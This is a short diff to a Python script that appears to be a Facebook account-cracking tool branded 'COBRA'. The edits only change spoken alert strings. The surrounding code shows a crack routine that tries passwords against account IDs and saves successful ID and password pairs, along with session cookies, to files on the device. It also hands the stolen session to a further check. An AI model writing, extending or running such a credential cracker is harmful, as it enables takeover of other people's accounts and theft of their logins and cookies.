@@ -161,7 +161,7 @@ while attempts < 12345677901:
     attempts += 1
 
     if username == 'FIROZ' and password == 'MUBIN':
-        print(' \033[0;92mLog in successfully brother.')
+        print(' \033[0;92mLog in successfully.')
         os.system('espeak -a 300 " You have logged in successfully  brother,"')
         break
     else:
@@ -506,7 +506,7 @@ def crack(idf,pwv):
 			if "checkpoint" in po.cookies.get_dict().keys():
 				#COBRA-BOSS
 				print(f'\r\033[0;94m[{time.strftime("%H:%M")}•COBRA-Cp] {idf} • {pw}')     
-				os.system('espeak -a 300 " mubin, CP, ID"')
+				os.system('espeak -a 300 " cobra, CP, ID"')
 				open('/sdcard/COBRA-CP.txt','a').write(idf+'|'+pw+'\n')
 				akun.append(idf+'|'+pw)
 				cp+=1
@@ -518,7 +518,7 @@ def crack(idf,pwv):
 				#COBRA-BOSS
 				print(f'\r\033[0;92m[{time.strftime("%H:%M")}•COBRA-Ok😘] {idf} • {pw}\n\033[0;93m[🇧🇩]= COOKIES • \033[0;92m{kuki} ')
 				print('\033[0;94m==============================================================')
-				os.system('espeak -a 300 "FIROZ, Ok, ID"')
+				os.system('espeak -a 300 "cobra, Ok, ID"')
 				open('/sdcard/COBRA-OK.txt', 'a').write( idf+' | '+pw+'\n'+'coki'+'\n')
 				cek_apk(session,coki)
 				break
